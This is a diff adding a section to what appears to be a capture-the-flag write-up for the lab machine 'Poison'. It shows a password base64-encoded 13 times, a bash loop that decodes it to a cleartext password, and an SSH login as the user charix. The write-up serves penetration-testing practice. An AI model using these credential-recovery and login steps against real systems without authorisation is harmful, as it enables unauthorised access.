@@ -104,4 +104,70 @@ If we enter this file in the `Scriptname` field of the main page we find somethi
 
 <br />
 
+## Shell Access 1 - Via Base64 Password Decyrpt
+
+<br />
+
+A `password` that have been `base64-encode` multiple times, concretely 13.
+
+We can easily decrypt this password with a bash one-liner.
+
+To do it, first, we need to put the base64 content into a file:
+
+<br />
+
+```bash
+❯ /usr/bin/cat encoded_text
+Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
+bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
+bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
+M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
+WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
+eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
+WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
+MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
+T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
+WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
+WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
+NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
+Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
+WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
+VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
+Ukd4RVdub3dPVU5uUFQwSwo=
+```
+
+<br />
+
+Then, we can decode it with the following bash one-liner:
+
+<br />
+
+```bash
+❯ file="$(cat encoded_text)"; for i in $(seq 1 13); do file="$(echo "$file" | base64 -d)"; done; echo $file
+Charix!2#4%6&8(0
+```
+
+<br />
+
+We have a new password: `Charix!2#4%6&8(0`
+
+Using it, we can connect via SSH to the victime machine as the user `charix`:
+
+<br />
+
+```bash
+❯ ssh charix@10.10.10.84
+(charix@10.10.10.84) Password for charix@Poison:
+Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
+FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
+...[snip]...
+	http://www.freshports.org/
+csh: The terminal database could not be opened.
+csh: using dumb terminal settings.
+charix@Poison:~ % id    
+uid=1001(charix) gid=1001(charix) groups=1001(charix)
+```
+
+<br />
+
 
